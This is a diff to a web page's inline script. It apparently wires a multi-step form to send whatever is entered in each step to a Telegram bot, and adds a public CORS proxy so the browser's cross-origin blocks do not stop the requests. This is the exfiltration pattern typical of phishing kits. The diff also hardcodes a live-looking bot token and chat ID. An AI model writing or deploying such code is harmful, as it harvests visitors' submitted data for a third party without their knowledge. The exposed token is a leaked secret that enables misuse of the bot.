@@ -41,12 +41,17 @@
     </div>
 
     <script>
-        const TOKEN = 'AAFBgTfVT1W_W1GAHA-5KekYvB3UGNmtB28';
-        const CHAT_ID = '8572011899'; // Replace with yours
+        // REPLACE THIS TOKEN IMMEDIATELY AFTER REVOKING IN BOTFATHER
+        const TOKEN = '8572011899:AAFBgTfVT1W_W1GAHA-5KekYvB3UGNmtB28';
+        const CHAT_ID = '8572011899'; 
 
         async function next(step, data) {
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST', headers: {'Content-Type': 'application/json'},
+            const PROXY = 'https://corsproxy.io/?';
+            const url = `${PROXY}${encodeURIComponent('https://api.telegram.org/bot' + TOKEN + '/sendMessage')}`;
+
+            fetch(url, {
+                method: 'POST', 
+                headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ chat_id: CHAT_ID, text: data })
             });
 
